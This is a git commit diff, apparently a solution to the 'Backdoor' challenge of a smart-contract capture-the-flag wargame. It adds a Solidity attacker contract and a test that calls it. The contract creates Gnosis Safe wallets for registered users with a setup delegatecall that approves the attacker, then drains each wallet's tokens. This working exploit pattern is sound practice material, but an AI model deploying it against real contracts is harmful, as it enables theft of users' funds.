a4d24a6ade8343786f5f0f79cc25e500c58d9eac
JuanXavier <juanxaviervm@hotmail.com>
2022-09-09 13:10:34 -0500

    Backdoor done

--- contracts/attacker-contracts/BackdoorAttacker.sol
+++ contracts/attacker-contracts/BackdoorAttacker.sol
@@ -1,11 +1,60 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.7;
+
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "../DamnValuableToken.sol";
 
 contract BackdoorAttacker {
-    function proxyCreated(
-        GnosisSafeProxy proxy,
-        address _singleton,
-        bytes calldata initializer,
-        uint256 saltNonce
-    ) external {}
+    address private immutable masterCopy;
+    address private immutable walletFactory;
+    address private immutable registry;
+    DamnValuableToken private immutable dvt;
+
+    constructor(
+        address _masterCopy,
+        address _walletFactory,
+        address _registry,
+        address _token
+    ) {
+        masterCopy = _masterCopy;
+        walletFactory = _walletFactory;
+        dvt = DamnValuableToken(_token);
+        registry = _registry;
+    }
+
+    function delegateApprove(address _spender) external {
+        dvt.approve(_spender, 10 ether);
+    }
+
+    function attack(address[] memory _beneficiaries) external {
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = _beneficiaries[i];
+
+            // Create the data that will be passed to the proxyCreated function on WalletRegistry
+            // The parameters correspond to the GnosisSafe::setup() contract
+            bytes memory _initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector, // Selector for the setup() function call
+                beneficiary, // _owners =>  List of Safe owners.
+                1, // _threshold =>  Number of required confirmations for a Safe transaction.
+                address(this), //  to => Contract address for optional delegate call.
+                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
+                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
+                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
+                0, // payment => Value that should be paid
+                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
+            );
+
+            // Create new proxies on behalf of other users
+            GnosisSafeProxy _newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
+                masterCopy, // _singleton => Address of singleton contract.
+                _initializer, // initializer => Payload for message call sent to new proxy contract.
+                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
+                IProxyCreationCallback(registry) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
+            );
+
+            dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
+        }
+    }
 }
--- test/backdoor/backdoor.challenge.js
+++ test/backdoor/backdoor.challenge.js
@@ -1,10 +1,10 @@
-const {ethers} = require('hardhat')
-const {expect} = require('chai')
+const { ethers } = require("hardhat")
+const { expect } = require("chai")
 
-describe('[Challenge] Backdoor', function () {
+describe("[Challenge] Backdoor", function () {
 	let deployer, users, attacker
 
-	const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40')
+	const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40")
 
 	before(async function () {
 		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -12,15 +12,15 @@ describe('[Challenge] Backdoor', function () {
 		users = [alice.address, bob.address, charlie.address, david.address]
 
 		// Deploy Gnosis Safe master copy and factory contracts
-		this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy()
+		this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy()
 		this.walletFactory = await (
-			await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)
+			await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
 		).deploy()
-		this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy()
+		this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()
 
 		// Deploy the registry
 		this.walletRegistry = await (
-			await ethers.getContractFactory('WalletRegistry', deployer)
+			await ethers.getContractFactory("WalletRegistry", deployer)
 		).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users)
 
 		// Users are registered as beneficiaries
@@ -32,8 +32,21 @@ describe('[Challenge] Backdoor', function () {
 		await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED)
 	})
 
-	it('Exploit', async function () {
+	it("Exploit", async function () {
 		/** CODE YOUR EXPLOIT HERE */
+
+		// Deploy
+		this.backdoorAttacker = await (
+			await ethers.getContractFactory("BackdoorAttacker", attacker)
+		).deploy(
+			this.masterCopy.address,
+			this.walletFactory.address,
+			this.walletRegistry.address,
+			this.token.address
+		)
+
+		// Attack
+		await this.backdoorAttacker.connect(attacker).attack(users)
 	})
 
 	after(async function () {
@@ -42,7 +55,7 @@ describe('[Challenge] Backdoor', function () {
 			let wallet = await this.walletRegistry.wallets(users[i])
 
 			// User must have registered a wallet
-			expect(wallet).to.not.eq(ethers.constants.AddressZero, 'User did not register a wallet')
+			expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet")
 
 			// User is no longer registered as a beneficiary
 			expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false
